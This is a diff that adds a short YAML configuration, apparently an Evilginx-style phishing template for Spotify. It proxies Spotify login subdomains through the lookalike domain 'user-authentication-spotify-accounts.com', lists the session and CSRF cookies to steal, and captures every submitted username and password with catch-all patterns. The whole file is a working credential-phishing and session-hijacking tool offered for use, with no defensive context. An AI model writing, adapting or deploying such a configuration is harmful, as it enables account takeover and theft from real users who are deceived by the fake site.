@@ -1,0 +1,29 @@
+name: ‘Spotify’
+author: ‘@simplerhacking’
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'spotify.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'spotify.com', session: false, is_landing: false}
+  - {phish_sub: 'open', orig_sub: 'open', domain: 'spotify.com', session: false, is_landing: false}
+  - {phish_sub: 'api-partner', orig_sub: 'api-partner', domain: 'spotify.com', session: false, is_landing: false}
+  - {phish_sub: 'guc3-spclient', orig_sub: 'guc3-spclient', domain: 'spotify.com', session: false, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'scdn.co', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'encore', orig_sub: 'encore', domain: 'scdn.co', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apresolve', orig_sub: 'apresolve', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'spotify.com', orig_sub: 'www', domain: 'spotify.com', search: 'spotify.com', replace: 'user-authentication-spotify-accounts.com', mimes: ['text/html', 'application/json', 'application/xhtml+xml']}
+auth_tokens:
+  - domain: '.spotify.com'
+    keys: ['sp_dc', 'sp_key', 'sp_landing', 'sp_landingref', 'sp_new', 'sp_sso_csrf_token', 'sp_t', 'sp_tr', '__Host-device_id', '__Host-sp_csrf_sid', '__Host-sp_sui', '__Secure-TPASESSION', '_fbp', '_ga', '_gat', '_gcl_au', '_gid', '_sc_cspv', '_scid', '_scid_r', 'sp_adid', 'OptanonConsent', '_ga_ZWG1NSHWD8']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.spotify.com'
+  path: '/login/password'
